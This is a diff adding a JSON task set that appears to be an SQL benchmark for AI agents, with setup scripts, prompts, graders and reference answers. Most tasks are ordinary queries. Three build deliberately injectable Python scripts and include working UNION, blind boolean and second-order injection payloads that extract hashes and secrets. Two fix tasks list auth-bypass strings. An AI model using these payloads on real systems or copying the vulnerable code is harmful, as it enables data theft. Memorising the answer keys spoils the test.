@@ -1,0 +1,112 @@
+{
+ "tasks": [
+  {
+   "id": "sql_top_spender",
+   "category": "join-agg",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 shop.db <<'SQL'\nCREATE TABLE customers(id INTEGER PRIMARY KEY, name TEXT);\nCREATE TABLE orders(id INTEGER PRIMARY KEY, customer_id INTEGER);\nCREATE TABLE order_items(order_id INTEGER, product TEXT, qty INTEGER, unit_price REAL);\nINSERT INTO customers VALUES (1,'Alice'),(2,'Bob'),(3,'Carol'),(4,'Dave');\nINSERT INTO orders VALUES (10,1),(11,1),(12,2),(13,3),(14,4);\nINSERT INTO order_items VALUES\n (10,'widget',2,5.0),(10,'gadget',1,20.0),\n (11,'gizmo',3,4.0),\n (12,'widget',10,5.0),\n (13,'gadget',4,20.0),\n (14,'gizmo',1,4.0);\nSQL\n",
+   "prompt": "shop.db has customers(id,name), orders(id,customer_id), order_items(order_id,product,qty,unit_price). A customer's spend is SUM(qty*unit_price) across all their order_items. Write a query that finds the single customer who spent the most, and write that customer's name to answer.txt (name only, nothing else).",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"Carol\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nsqlite3 shop.db \"SELECT c.name FROM customers c JOIN orders o ON o.customer_id=c.id JOIN order_items i ON i.order_id=o.id GROUP BY c.id ORDER BY SUM(i.qty*i.unit_price) DESC LIMIT 1;\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_fraud_shared_card",
+   "category": "join-agg",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 fraud.db <<'SQL'\nCREATE TABLE accounts(id INTEGER PRIMARY KEY, holder TEXT);\nCREATE TABLE payments(id INTEGER PRIMARY KEY, account_id INTEGER, card_number TEXT, amount REAL);\nINSERT INTO accounts VALUES (1,'Alice'),(2,'Bob'),(3,'Carol');\nINSERT INTO payments VALUES\n (1,1,'4111111111111111',10.0),\n (2,1,'4111111111111111',12.0),\n (3,2,'5500000000000004',30.0),\n (4,3,'5500000000000004',15.0),\n (5,1,'4111111111111111',9.0),\n (6,2,'6011000000000004',40.0);\nSQL\n",
+   "prompt": "fraud.db has accounts(id,holder) and payments(id,account_id,card_number,amount). One card_number was used by more than one distinct account_id (a shared-card fraud signal). Write a query that finds that card_number and write it to answer.txt (the card number only).",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"5500000000000004\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nsqlite3 fraud.db \"SELECT card_number FROM payments GROUP BY card_number HAVING COUNT(DISTINCT account_id)>1;\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_invoice_gap",
+   "category": "sequence",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 inv.db <<'SQL'\nCREATE TABLE invoices(number INTEGER PRIMARY KEY, amount REAL);\nINSERT INTO invoices VALUES\n (1000,5),(1001,6),(1002,7),(1003,8),(1004,9),\n (1005,10),(1006,11),(1008,12),(1009,13),(1010,14);\nSQL\n",
+   "prompt": "inv.db has invoices(number,amount). The invoice numbers should form a contiguous run from MIN(number) to MAX(number), but exactly one number in that range is missing. Write a query that finds the missing number and write it to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"1007\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nsqlite3 inv.db \"WITH RECURSIVE seq(n) AS (SELECT MIN(number) FROM invoices UNION ALL SELECT n+1 FROM seq WHERE n<(SELECT MAX(number) FROM invoices)) SELECT n FROM seq WHERE n NOT IN (SELECT number FROM invoices);\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_running_total_day",
+   "category": "window",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 sales.db <<'SQL'\nCREATE TABLE daily_sales(day TEXT PRIMARY KEY, amount INTEGER);\nINSERT INTO daily_sales VALUES\n ('2024-01-01',30),('2024-01-02',25),('2024-01-03',20),\n ('2024-01-04',40),('2024-01-05',10);\nSQL\n",
+   "prompt": "sales.db has daily_sales(day,amount) ordered by day. Compute the running (cumulative) total of amount ordered by day, and find the earliest day on which the running total first reaches 100 or more. Write that day (YYYY-MM-DD) to answer.txt. Use a window function.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"2024-01-04\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nsqlite3 sales.db \"SELECT day FROM (SELECT day, SUM(amount) OVER (ORDER BY day) AS c FROM daily_sales) WHERE c>=100 ORDER BY day LIMIT 1;\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_org_deepest",
+   "category": "recursive-cte",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 org.db <<'SQL'\nCREATE TABLE employees(id INTEGER PRIMARY KEY, name TEXT, manager_id INTEGER);\nINSERT INTO employees VALUES\n (1,'CEO',NULL),\n (2,'VP',1),\n (3,'Dir',2),\n (4,'Mgr',3),\n (5,'Eng',4),\n (6,'Sales',2),\n (7,'Rep',6);\nSQL\n",
+   "prompt": "org.db has employees(id,name,manager_id); manager_id is NULL for the root. Depth of the root is 1, each level down adds 1. Write a recursive query that finds the single employee with the greatest depth and write that employee's name to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"Eng\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nsqlite3 org.db \"WITH RECURSIVE chain(id,name,depth) AS (SELECT id,name,1 FROM employees WHERE manager_id IS NULL UNION ALL SELECT e.id,e.name,c.depth+1 FROM employees e JOIN chain c ON e.manager_id=c.id) SELECT name FROM chain ORDER BY depth DESC, name LIMIT 1;\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_bom_total",
+   "category": "recursive-cte",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 bom.db <<'SQL'\nCREATE TABLE components(parent TEXT, child TEXT, qty INTEGER);\nINSERT INTO components VALUES\n ('chassis','frame',1),\n ('chassis','panel',2),\n ('frame','panel',3),\n ('panel','screw',4),\n ('panel','bolt',1);\nSQL\n",
+   "prompt": "bom.db has components(parent,child,qty): building one 'parent' needs qty of each 'child', and children may themselves be assemblies. Compute the total number of 'screw' parts required to build one 'chassis' (multiply quantities along each path and sum). Write the number to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"20\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nsqlite3 bom.db \"WITH RECURSIVE bom(child,qty) AS (SELECT child,qty FROM components WHERE parent='chassis' UNION ALL SELECT c.child,b.qty*c.qty FROM bom b JOIN components c ON c.parent=b.child) SELECT SUM(qty) FROM bom WHERE child='screw';\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_second_salary",
+   "category": "window",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 hr.db <<'SQL'\nCREATE TABLE employees(name TEXT, dept TEXT, salary INTEGER);\nINSERT INTO employees VALUES\n ('Alice','Engineering',120),\n ('Bob','Engineering',100),\n ('Carol','Engineering',90),\n ('Dave','Sales',80),\n ('Eve','Sales',70);\nSQL\n",
+   "prompt": "hr.db has employees(name,dept,salary). Write a query using a window function that finds the employee with the second-highest salary within the 'Engineering' department, and write that employee's name to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"Bob\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nsqlite3 hr.db \"SELECT name FROM (SELECT name,dept,DENSE_RANK() OVER (PARTITION BY dept ORDER BY salary DESC) rk FROM employees) WHERE dept='Engineering' AND rk=2;\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_inject_union",
+   "category": "injection",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 store.db <<'SQL'\nCREATE TABLE products(id INTEGER PRIMARY KEY, name TEXT, price REAL);\nCREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password_hash TEXT);\nINSERT INTO products VALUES (1,'apple',1.5),(2,'banana',0.9),(3,'cherry',3.0);\nINSERT INTO users VALUES (1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'),(2,'guest','098f6bcd4621d373cade4e832627b4f6');\nSQL\ncat > search.py <<'PY'\nimport sqlite3, sys\nterm = sys.argv[1]\nsql = \"SELECT id, name, price FROM products WHERE name LIKE '%\" + term + \"%'\"\nopen('run.log','a').write(sql + '\\n')\ncon = sqlite3.connect('store.db')\nfor row in con.execute(sql):\n    print('|'.join(str(x) for x in row))\nPY\n",
+   "prompt": "search.py is a product-search endpoint: run it as `python3 search.py \"<term>\"` and it prints matching product rows (id|name|price). It builds SQL by string-concatenating your term, so it is injectable. The store.db also has a users(id,username,password_hash) table. Exploit a UNION-based injection through search.py to read the password_hash of the user 'admin', and write that hash to answer.txt. You must obtain it via search.py.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngrep -qi 'union' run.log 2>/dev/null || { echo FAIL; exit 0; }\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"5f4dcc3b5aa765d61d8327deb882cf99\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 search.py \"' UNION SELECT id, username, password_hash FROM users -- \" | awk -F'|' '$2==\"admin\"{print $3}' > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_inject_blind",
+   "category": "injection",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 blind.db <<'SQL'\nCREATE TABLE products(id INTEGER PRIMARY KEY, name TEXT);\nCREATE TABLE secrets(id INTEGER PRIMARY KEY, flag TEXT);\nINSERT INTO products VALUES (1,'apple'),(2,'banana');\nINSERT INTO secrets VALUES (1,'FLAG7Q');\nSQL\ncat > oracle.py <<'PY'\nimport sqlite3, sys\ninp = sys.argv[1]\nsql = \"SELECT COUNT(*) FROM products WHERE name = '\" + inp + \"'\"\nopen('run.log','a').write(sql + '\\n')\ncon = sqlite3.connect('blind.db')\nc = con.execute(sql).fetchone()[0]\nprint(1 if c > 0 else 0)\nPY\n",
+   "prompt": "oracle.py is a boolean oracle: `python3 oracle.py \"<input>\"` prints 1 if a product named exactly <input> exists, else 0. It concatenates your input into the WHERE clause, so it is injectable but only ever leaks one bit (1/0). The blind.db has secrets(id,flag) with a 6-character flag over [A-Z0-9] at id=1. Use blind boolean injection (e.g. substr(flag,i,1)) to recover the flag one character at a time, and write the full 6-character flag to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngrep -q 'substr' run.log 2>/dev/null || { echo FAIL; exit 0; }\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"FLAG7Q\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nflag=\"\"\nfor i in $(seq 1 6); do\n  for c in {A..Z} {0..9}; do\n    r=$(python3 oracle.py \"apple' AND (SELECT substr(flag,$i,1) FROM secrets WHERE id=1)='$c\")\n    if [ \"$r\" = \"1\" ]; then flag=\"$flag$c\"; break; fi\n  done\ndone\nprintf '%s' \"$flag\" > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_inject_second_order",
+   "category": "injection",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 so.db <<'SQL'\nCREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, role TEXT);\nCREATE TABLE notes(owner TEXT, note TEXT);\nCREATE TABLE admin_secret(token TEXT);\nINSERT INTO notes VALUES ('system','startup ok');\nINSERT INTO admin_secret VALUES ('TKN-9F3A');\nSQL\ncat > register.py <<'PY'\nimport sqlite3, sys\nu = sys.argv[1]\ncon = sqlite3.connect('so.db')\ncur = con.execute(\"INSERT INTO users(username, role) VALUES (?, 'user')\", (u,))\ncon.commit()\nprint(cur.lastrowid)\nPY\ncat > profile.py <<'PY'\nimport sqlite3, sys\nuid = sys.argv[1]\ncon = sqlite3.connect('so.db')\nuname = con.execute(\"SELECT username FROM users WHERE id=?\", (uid,)).fetchone()[0]\nsql = \"SELECT note FROM notes WHERE owner='\" + uname + \"'\"\nopen('run.log','a').write(sql + '\\n')\nfor r in con.execute(sql):\n    print(r[0])\nPY\n",
+   "prompt": "so.db has an app with two endpoints. register.py stores a username SAFELY (parameterized insert): `python3 register.py \"<username>\"` prints the new user id. profile.py then reads that stored username back and builds `SELECT note FROM notes WHERE owner='<username>'` by string concatenation (a second-order injection). The db also holds admin_secret(token). Register a username whose stored value makes profile.py leak the admin_secret token, run profile.py on the returned id, and write the token to answer.txt.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ngrep -qi 'union' run.log 2>/dev/null || { echo FAIL; exit 0; }\ngot=$(tr -d '[:space:]' < answer.txt 2>/dev/null)\n[ \"$got\" = \"TKN-9F3A\" ] && echo PASS || echo FAIL\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\nid=$(python3 register.py \"zz' UNION SELECT token FROM admin_secret -- \")\npython3 profile.py \"$id\" | tr -d '[:space:]' > answer.txt\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_fix_lookup",
+   "category": "fix-query",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 users.db <<'SQL'\nCREATE TABLE accounts(id INTEGER PRIMARY KEY, username TEXT, email TEXT);\nINSERT INTO accounts VALUES\n (1,'alice','alice@example.com'),\n (2,'bob','bob@example.com'),\n (3,'carol','carol@example.com');\nSQL\ncat > lookup.py <<'PY'\nimport sqlite3\ndef find(username):\n    con = sqlite3.connect('users.db')\n    sql = \"SELECT id, username, email FROM accounts WHERE username = '%s'\" % username\n    return con.execute(sql).fetchall()\nPY\n",
+   "prompt": "lookup.py defines find(username) which builds its SQL with an f-string/%-format, so find(\"' OR '1'='1\") leaks every account. Rewrite find in place to use a parameterized query so that injection no longer works, while the benign case still returns the correct row. Keep the function name find and its return type (list of (id, username, email) tuples). find('alice') must still return exactly [(1,'alice','alice@example.com')]; an injection payload must return no rows. Do not change users.db.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\nimport importlib.util\nspec=importlib.util.spec_from_file_location('lookup','lookup.py')\nm=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)\nbenign=list(m.find('alice'))\ninj1=list(m.find(\"' OR '1'='1\"))\ninj2=list(m.find(\"x' OR 1=1 --\"))\nok = benign==[(1,'alice','alice@example.com')] and inj1==[] and inj2==[]\nprint('PASS' if ok else 'FAIL')\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ncat > lookup.py <<'PY'\nimport sqlite3\ndef find(username):\n    con = sqlite3.connect('users.db')\n    sql = \"SELECT id, username, email FROM accounts WHERE username = ?\"\n    return con.execute(sql, (username,)).fetchall()\nPY\n",
+   "self_test_passed": true
+  },
+  {
+   "id": "sql_fix_login",
+   "category": "fix-query",
+   "setup_sh": "#!/usr/bin/env bash\nset -e\nsqlite3 auth.db <<'SQL'\nCREATE TABLE users(username TEXT, password TEXT);\nINSERT INTO users VALUES ('alice','secret123'),('bob','hunter2');\nSQL\ncat > login.py <<'PY'\nimport sqlite3\ndef authenticate(user, pw):\n    con = sqlite3.connect('auth.db')\n    sql = \"SELECT COUNT(*) FROM users WHERE username='%s' AND password='%s'\" % (user, pw)\n    return con.execute(sql).fetchone()[0] > 0\nPY\n",
+   "prompt": "login.py defines authenticate(user, pw) that builds SQL with %-formatting, so authenticate('alice', \"' OR '1'='1\") wrongly returns True (auth bypass). Rewrite authenticate in place to use a parameterized query. Requirements the grader checks: authenticate('alice','secret123') is True, authenticate('alice','wrong') is False, and every injection bypass (e.g. \"' OR '1'='1\", \"admin' --\", \"' OR 1=1 --\") returns False. Keep the function name and signature. Do not change auth.db.",
+   "grader_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\npython3 - <<'PY'\nimport importlib.util\nspec=importlib.util.spec_from_file_location('login','login.py')\nm=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)\nchecks=[\n m.authenticate('alice','secret123')==True,\n m.authenticate('alice','wrong')==False,\n m.authenticate('alice',\"' OR '1'='1\")==False,\n m.authenticate(\"admin' --\",\"whatever\")==False,\n m.authenticate(\"' OR 1=1 --\",\"x\")==False,\n]\nprint('PASS' if all(checks) else 'FAIL')\nPY\n",
+   "reference_solution_sh": "#!/usr/bin/env bash\ncd \"$W\" || exit 1\ncat > login.py <<'PY'\nimport sqlite3\ndef authenticate(user, pw):\n    con = sqlite3.connect('auth.db')\n    sql = \"SELECT COUNT(*) FROM users WHERE username=? AND password=?\"\n    return con.execute(sql, (user, pw)).fetchone()[0] > 0\nPY\n",
+   "self_test_passed": true
+  }
+ ]
+}
